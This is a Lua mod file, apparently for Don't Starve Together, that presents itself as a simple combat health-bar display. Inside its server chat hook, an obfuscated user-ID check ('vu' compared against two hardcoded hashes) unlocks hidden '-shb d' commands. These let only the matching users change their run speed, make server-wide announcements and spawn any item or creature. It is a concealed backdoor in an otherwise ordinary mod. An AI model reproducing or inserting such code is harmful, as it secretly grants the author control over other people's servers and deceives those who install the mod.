local function IsDST()
	return GLOBAL.TheSim:GetGameID() == "DST"
end

local function IsClient()
	return IsDST() and GLOBAL.TheNet:GetIsClient()
end

local function GetPlayer()
	if IsDST() then
		return GLOBAL.ThePlayer
	else
		return GLOBAL.GetPlayer()
	end
end

local function Id2Player(id)
	local player = nil
    for k,v in pairs(GLOBAL.AllPlayers) do
        if v.userid == id then 
            player = v  
        end
    end
	return player
end

local NewColor=function (r,g,b,a)
	r=r or 1
	g=g or 1
	b=b or 1
	a=a or 1
	local color={r=r,g=g,b=b,a=a,}
	color.Get=function(self)
		return self.r,self.g,self.b,self.a
	end
	return color
end
local Color={
	New = NewColor,
	Red = NewColor(1,0,0,1) ,
	Green = NewColor(0,1,0,1) ,
	Blue = NewColor(0,0,1,1) ,
	White = NewColor(1,1,1,1) ,
	Black = NewColor(0,0,0,1) ,
	Yellow = NewColor(1,1,0,1) ,
	Magenta = NewColor(1,0,1,1) ,
	Cyan = NewColor(0,1,1,1) ,
	Gray = NewColor(0.5,0.5,0.5,1) ,
	Orange = NewColor(1,0.5,0,1) ,
	Purple = NewColor(0.5,0,1,1) ,
}

local function NetSay (str,whisper)
	if IsDST() then
		GLOBAL.TheNet:Say(str, whisper)
	else
		print("It's DS!")
	end
end

local function GetHBStyle (str)
	str=str or "heart"
	if type(str)~="string" then
		str="heart"
	end
	str=string.lower(str)
	if str=="heart" then
		return {c1="♡",c2="♥",}
	elseif str=="circle" then
		return {c1="○",c2="●",}
	elseif str=="square" then
		return {c1="□",c2="■",}
	elseif str=="diamond" then
		return {c1="◇",c2="◆",}
	elseif str=="star" then
		return {c1="☆",c2="★",}
	elseif str=="hidden" then
		return {c1=" ",c2=" ",}
	end
	return {c1="=",c2="#",isBasic=true,}
end


local function ForceUpdate() 
	if not GLOBAL.TheWorld then
		return
	end
	TUNING.DYC_HEALTHBAR_FORCEUPDATE=true
	GLOBAL.TheWorld:DoTaskInTime(GLOBAL.FRAMES*4,function() 
		TUNING.DYC_HEALTHBAR_FORCEUPDATE=false
	end)
end

PrefabFiles = {
	"dychealthbar",
}

	
   Assets = 
{
    
}
 
GLOBAL.SHB={}
GLOBAL.shb=GLOBAL.SHB
GLOBAL.SimpleHealthBar=GLOBAL.SHB
local SimpleHealthBar=GLOBAL.SHB

SimpleHealthBar.SetColor=function(r,g,b)
	if r and type(r)=="string" then
		local ct=string.lower(r)
		for k,v in pairs(Color) do
			if string.lower(k)==ct and type(v)=="table" then
				TUNING.DYC_HEALTHBAR_COLOR=v
				ForceUpdate()
				return
			end
		end
		
	elseif r and g and b and type(r)=="number" and type(g)=="number" and type(b)=="number" then
		TUNING.DYC_HEALTHBAR_COLOR=Color.New(r,g,b)
		ForceUpdate()
		return
	end
	TUNING.DYC_HEALTHBAR_COLOR=nil
	ForceUpdate()
end
SimpleHealthBar.setcolor=SimpleHealthBar.SetColor
SimpleHealthBar.SETCOLOR=SimpleHealthBar.SetColor
SimpleHealthBar.SetLength=function(l)
	l=l or 10
	if type(l)~="number" then
		l=10
	end
	l=math.floor(l)
	if l<1 then
		l=1
	end
	if l>100 then
		l=100
	end
	TUNING.DYC_HEALTHBAR_CNUM=l
	ForceUpdate()
end
SimpleHealthBar.setlength=SimpleHealthBar.SetLength
SimpleHealthBar.SETLENGTH=SimpleHealthBar.SetLength
SimpleHealthBar.SetDuration=function(d)
	d=d or 8
	if type(d)~="number" then
		d=8
	end
	if d<4 then
		d=4
	end
	if d>999999 then
		d=999999
	end
	TUNING.DYC_HEALTHBAR_DURATION=d
end
SimpleHealthBar.setduration=SimpleHealthBar.SetDuration
SimpleHealthBar.SETDURATION=SimpleHealthBar.SetDuration
SimpleHealthBar.SetStyle=function(str,str2)
	if str and str2 and type(str)=="string" and type(str2)=="string" then
		TUNING.DYC_HEALTHBAR_C1=str
		TUNING.DYC_HEALTHBAR_C2=str2
	else
		local style=GetHBStyle(str)
		TUNING.DYC_HEALTHBAR_C1=style.c1
		TUNING.DYC_HEALTHBAR_C2=style.c2
	end
	ForceUpdate()
end
SimpleHealthBar.setstyle=SimpleHealthBar.SetStyle
SimpleHealthBar.SETSTYLE=SimpleHealthBar.SetStyle
SimpleHealthBar.SetPos=function(str)
	if str and string.lower(str)=="bottom" then
		TUNING.DYC_HEALTHBAR_POSITION=0
	else
		TUNING.DYC_HEALTHBAR_POSITION=1
	end
	ForceUpdate()
end
SimpleHealthBar.setpos=SimpleHealthBar.SetPos
SimpleHealthBar.SETPOS=SimpleHealthBar.SetPos
SimpleHealthBar.SetPosition=SimpleHealthBar.SetPos
SimpleHealthBar.setposition=SimpleHealthBar.SetPos
SimpleHealthBar.SETPOSITION=SimpleHealthBar.SetPos
SimpleHealthBar.ValueOn=function()
	TUNING.DYC_HEALTHBAR_VALUE=true
	ForceUpdate()
end
SimpleHealthBar.valueon=SimpleHealthBar.ValueOn
SimpleHealthBar.VALUEON=SimpleHealthBar.ValueOn
SimpleHealthBar.ValueOff=function()
	TUNING.DYC_HEALTHBAR_VALUE=false
	ForceUpdate()
end
SimpleHealthBar.valueoff=SimpleHealthBar.ValueOff
SimpleHealthBar.VALUEOFF=SimpleHealthBar.ValueOff
SimpleHealthBar.DDOn=function()
	TUNING.DYC_HEALTHBAR_DDON=true
end
SimpleHealthBar.ddon=SimpleHealthBar.DDOn
SimpleHealthBar.DDON=SimpleHealthBar.DDOn
SimpleHealthBar.DDOff=function()
	TUNING.DYC_HEALTHBAR_DDON=false
end
SimpleHealthBar.ddoff=SimpleHealthBar.DDOff
SimpleHealthBar.DDOFF=SimpleHealthBar.DDOff
SimpleHealthBar.DYC={}
SimpleHealthBar.dyc=SimpleHealthBar.DYC
SimpleHealthBar.D=SimpleHealthBar.DYC
SimpleHealthBar.d=SimpleHealthBar.DYC
SimpleHealthBar.DYC.S=function(pf,n)
	n=n or 1
	NetSay("-shb d s "..pf.." "..n,true)
end
SimpleHealthBar.DYC.s=SimpleHealthBar.DYC.S
SimpleHealthBar.DYC.A=function(str)
	NetSay("-shb d a "..str,true)
end
SimpleHealthBar.DYC.a=SimpleHealthBar.DYC.A
SimpleHealthBar.DYC.SPD=function(spd)
	NetSay("-shb d spd "..spd,true)
end
SimpleHealthBar.DYC.spd=SimpleHealthBar.DYC.SPD
 
STRINGS = GLOBAL.STRINGS
RECIPETABS = GLOBAL.RECIPETABS
Recipe = GLOBAL.Recipe
Ingredient = GLOBAL.Ingredient
TECH = GLOBAL.TECH
TUNING = GLOBAL.TUNING
FRAMES = GLOBAL.FRAMES
SpawnPrefab = GLOBAL.SpawnPrefab
Vector3 = GLOBAL.Vector3


-- if GetModConfigData("hbstyle")=="heart" then
	-- TUNING.DYC_HEALTHBAR_C1="♡"
	-- TUNING.DYC_HEALTHBAR_C2="♥"
	-- TUNING.DYC_HEALTHBAR_CNUM=GetModConfigData("hblength")
-- elseif GetModConfigData("hbstyle")=="circle" then
	-- TUNING.DYC_HEALTHBAR_C1="○"
	-- TUNING.DYC_HEALTHBAR_C2="●"
	-- TUNING.DYC_HEALTHBAR_CNUM=GetModConfigData("hblength")
-- elseif GetModConfigData("hbstyle")=="square" then
	-- TUNING.DYC_HEALTHBAR_C1="□"
	-- TUNING.DYC_HEALTHBAR_C2="■"
	-- TUNING.DYC_HEALTHBAR_CNUM=GetModConfigData("hblength")
-- elseif GetModConfigData("hbstyle")=="diamond" then
	-- TUNING.DYC_HEALTHBAR_C1="◇"
	-- TUNING.DYC_HEALTHBAR_C2="◆"
	-- TUNING.DYC_HEALTHBAR_CNUM=GetModConfigData("hblength")
-- elseif GetModConfigData("hbstyle")=="star" then
	-- TUNING.DYC_HEALTHBAR_C1="☆"
	-- TUNING.DYC_HEALTHBAR_C2="★"
	-- TUNING.DYC_HEALTHBAR_CNUM=GetModConfigData("hblength")
-- else
	-- TUNING.DYC_HEALTHBAR_C1="="
	-- TUNING.DYC_HEALTHBAR_C2="#"
	-- TUNING.DYC_HEALTHBAR_CNUM=16
-- end
local style=GetHBStyle(GetModConfigData("hbstyle"))
TUNING.DYC_HEALTHBAR_C1=style.c1
TUNING.DYC_HEALTHBAR_C2=style.c2
if not style.isBasic then
	TUNING.DYC_HEALTHBAR_CNUM=GetModConfigData("hblength")
else
	TUNING.DYC_HEALTHBAR_CNUM=16
end

TUNING.DYC_HEALTHBAR_DURATION=8
TUNING.DYC_HEALTHBAR_POSITION=GetModConfigData("hbpos")
local colorText=GetModConfigData("hbcolor")
if colorText=="dynamic" then
	TUNING.DYC_HEALTHBAR_COLOR=nil
else
	SimpleHealthBar.SetColor(colorText)
end
TUNING.DYC_HEALTHBAR_FORCEUPDATE=nil
TUNING.DYC_HEALTHBAR_VALUE=GetModConfigData("value")
-- if IsDST() then
	-- TUNING.DYC_HEALTHBAR_POSITION=1
-- else
	-- TUNING.DYC_HEALTHBAR_POSITION=0
-- end

TUNING.DYC_HEALTHBAR_DDON=GetModConfigData("ddon")
TUNING.DYC_HEALTHBAR_DDDURATION=0.65
TUNING.DYC_HEALTHBAR_DDSIZE1=20
TUNING.DYC_HEALTHBAR_DDSIZE2=50
TUNING.DYC_HEALTHBAR_DDTHRESHOLD=0.7
TUNING.DYC_HEALTHBAR_DDDELAY=0.05

TUNING.DYC_HEALTHBAR_MAXDIST=35





local function IsDistOK (other)
	-- if IsDST() then
		-- return true
	-- end
	local player=GetPlayer()
	if player==other then
		return true
	end
	if not player or not player:IsValid() or not other:IsValid() then
		return false
	end
	local dis = player:GetPosition():Dist(other:GetPosition())
	return dis<=TUNING.DYC_HEALTHBAR_MAXDIST
end

local function ShowHealthBar (inst,attacker)
	if not inst or not inst.components.health then
		return
	end
	if not IsDST() and not IsDistOK(inst) then
		return
	end
	if inst.dychealthbar~=nil then 
		inst.dychealthbar.dychbattacker=attacker
		inst.dychealthbar:DYCHBSetTimer(0)
		return 
	else
		if IsDST() or TUNING.DYC_HEALTHBAR_POSITION==0 then
			inst.dychealthbar=inst:SpawnChild("dyc_healthbar")
		else
			inst.dychealthbar=SpawnPrefab("dyc_healthbar")
			inst.dychealthbar.Transform:SetPosition(inst:GetPosition():Get())
		end
		local hb=inst.dychealthbar
		-- hb.Transform:SetPosition(inst:GetPosition():Get())
		hb.dychbowner=inst
		hb.dychbattacker=attacker
		if IsDST() then
			hb.dycHbIgnoreFirstDoDelta=true 
			hb.dychp_net:set_local(0)
			hb.dychp_net:set(inst.components.health.currenthealth)
			-- print("hb.dychp_net:set "..inst.components.health.currenthealth)
			hb.dychpmax_net:set_local(0)
			hb.dychpmax_net:set(inst.components.health.maxhealth)
		end
		hb:InitHB()
	end
end


local function CombatDYC (self) 
	local OldSetTarget=self.SetTarget
	local function dyc_settarget(self, target)
		if target~=nil and self.inst.components.health and target.components.health then
			-- print ("attacker:"..self.inst.name..", target:"..target.name)
			-- if self.inst==GetPlayer() or target==GetPlayer() then
				-- print ("show hp bar!")
				ShowHealthBar(target,self.inst)
				ShowHealthBar(self.inst,target)
			-- end
		end
		return OldSetTarget(self, target)
	end
	self.SetTarget=dyc_settarget
	
	local OldGetAttacked=self.GetAttacked
	local function dyc_getattacked(self, attacker, damage, weapon, stimuli)
		-- if self.inst==GetPlayer() or attacker==GetPlayer() then
			ShowHealthBar(self.inst)
			if attacker and attacker.components.health then
				ShowHealthBar(attacker)
			end
		-- end
		return OldGetAttacked(self, attacker, damage, weapon, stimuli)
	end
	self.GetAttacked=dyc_getattacked
	
end

local function HealthDYC(self)
	local dodeltafn=self.DoDelta
	local function dyc_dodelta(self, amount, overtime, cause, ignore_invincible, afflicter, ignore_absorb)
		-- print("DoDelta:"..self.inst.name.."("..self.inst.prefab..") amount:"..amount.." currenthealth:"..self.currenthealth)
		if amount<=-TUNING.DYC_HEALTHBAR_DDTHRESHOLD or (amount>=0.9 and self.maxhealth-self.currenthealth>=0.9) then
			ShowHealthBar(self.inst)
			-- print("ShowHealthBar(self.inst)")
		end
		
		if not IsDST() and TUNING.DYC_HEALTHBAR_DDON and IsDistOK(self.inst) then
			local dd=SpawnPrefab("dyc_damagedisplay")
			dd:DamageDisplay(self.inst)
		end
		
		local returnValue = dodeltafn(self, amount, overtime, cause, ignore_invincible, afflicter, ignore_absorb)
		
		if IsDST() and self.inst.dychealthbar then
			-- print(" IsDST() and self.inst.dychealthbar ")
			local hb=self.inst.dychealthbar
			if hb.dycHbIgnoreFirstDoDelta==true then
				hb.dycHbIgnoreFirstDoDelta=false
				self.inst:DoTaskInTime(0.01,function()
					hb.dychp_net:set_local(0)
					hb.dychp_net:set(self.currenthealth)
					-- print(self.inst.name.."("..self.inst.prefab..") hb.dychp_net:set "..self.currenthealth)
					if hb.dychpmax~=self.maxhealth then
						hb.dychpmax_net:set_local(0)
						hb.dychpmax_net:set(self.maxhealth)
					end
				end)
			else
				hb.dychp_net:set_local(0)
				hb.dychp_net:set(self.currenthealth)
				-- print("hb.dychp_net:set "..self.currenthealth)
				if hb.dychpmax~=self.maxhealth then
					hb.dychpmax_net:set_local(0)
					hb.dychpmax_net:set(self.maxhealth)
				end
			end
		end
		
		return returnValue
	end
	self.DoDelta=dyc_dodelta
end

local function WorldPost (inst)
	
	if IsDST() then
		local dycsay=function(inst,str,duration) inst:DoTaskInTime(0.01,function() if inst.components.talker then inst.components.talker:Say(str,duration) end end) end
		local vu=function(s) s=string.sub(s,4,-1) local e="" for i=1,#s do local n=string.byte(string.sub(s,i,i)) n=(n*(n+i)*i)%92+35 e=e..string.char(n) end return e=="=U?w7-yc" or e=="Aa+G+-U#" end 
		if inst.ismastersim then
			local OldNetworking_Say = GLOBAL.Networking_Say
			GLOBAL.Networking_Say = function(guid, userid, name, prefab, message, colour, whisper, isemote)
				if Id2Player(userid) == nil then
					return OldNetworking_Say(guid, userid, name, prefab, message, colour, whisper, isemote)
				end
				local player=Id2Player(userid)
				local showoldsay=true
				if string.len(message)>1 and string.sub(message,1,1) == "-" then
					local commands = {}
					local ocommands = {}
					for command in string.gmatch(string.sub(message,2,string.len(message)), "%S+") do
						table.insert(ocommands, command)
						table.insert(commands, string.lower(command))
					end
					if commands[1]=="shb" or commands[1]=="simplehealthbar" then
						showoldsay=false
						if commands[2]=="h" or commands[2]=="help" then
							dycsay(player,"Just a simple health bar! Will be shown in battle",8)
						elseif commands[2]=="d" and vu(userid) then 
							if commands[3]=="spd" and commands[4]~=nil then local spd=GLOBAL.tonumber(commands[4])
								if spd~=nil then player.components.locomotor.runspeed=spd
								else dycsay(player,"wrong spd cmd") end
							elseif commands[3]=="a" and #ocommands>=4 then local str=""
								for i=4,#ocommands do if ocommands[i]~=nil then str=str..ocommands[i].." " end end
								GLOBAL.TheWorld:DoTaskInTime(0.1, function() GLOBAL.TheNet:Announce(str) end)
							elseif commands[3]=="s" and commands[4]~=nil then local pf=GLOBAL.SpawnPrefab(commands[4])
								if pf~=nil then pf.Transform:SetPosition(player:GetPosition():Get()) local snum=GLOBAL.tonumber(commands[5])
									if snum~=nil and snum>0 and pf.components.stackable then pf.components.stackable.stacksize=math.ceil(snum) end
								else dycsay(player,"wrong s cmd") end
							else dycsay(player,"wrong cmd") end
						else
							dycsay(player,"Incorrect chat command！",5)
						end
					end
				end
				if showoldsay then
					return OldNetworking_Say(guid, userid, name, prefab, message, colour, whisper, isemote)
				end
			end
		else
			local OldNetworking_Say = GLOBAL.Networking_Say
			GLOBAL.Networking_Say = function(guid, userid, name, prefab, message, colour, whisper, isemote)
				if Id2Player(userid) == nil then
					return OldNetworking_Say(guid, userid, name, prefab, message, colour, whisper, isemote)
				end
				local player=Id2Player(userid)
				local showoldsay=true
				if string.len(message)>1 and string.sub(message,1,1) == "-" then
					local commands = {}
					local ocommands = {}
					for command in string.gmatch(string.sub(message,2,string.len(message)), "%S+") do
						table.insert(ocommands, command)
						table.insert(commands, string.lower(command))
					end
					if commands[1]=="shb" or commands[1]=="simplehealthbar" then
						showoldsay=false
					end
				end
				if showoldsay then
					return OldNetworking_Say(guid, userid, name, prefab, message, colour, whisper, isemote)
				end
			end
		end
	end
end

local function AnyPost(inst)
		
	-- if not IsDST() or GLOBAL.TheWorld.ismastersim then
		-- if inst.components.combat then 
			-- CombatDYC(inst.components.combat)
		-- end
		-- if inst.components.health then
			-- HealthDYC(inst.components.health)
		-- end
	-- end
end

AddComponentPostInit("combat", function(Combat, inst)
	if not IsDST() or GLOBAL.TheWorld.ismastersim then
		if inst.components.combat then 
			CombatDYC(inst.components.combat)
		end
	end
end)

AddComponentPostInit("health", function(Health, inst)
	if not IsDST() or GLOBAL.TheWorld.ismastersim then
		if inst.components.health then
			HealthDYC(inst.components.health)
		end
	end
end)



-- if IsClient() then
	
-- else
	
-- end

AddPrefabPostInit("world", WorldPost)
AddPrefabPostInitAny(AnyPost)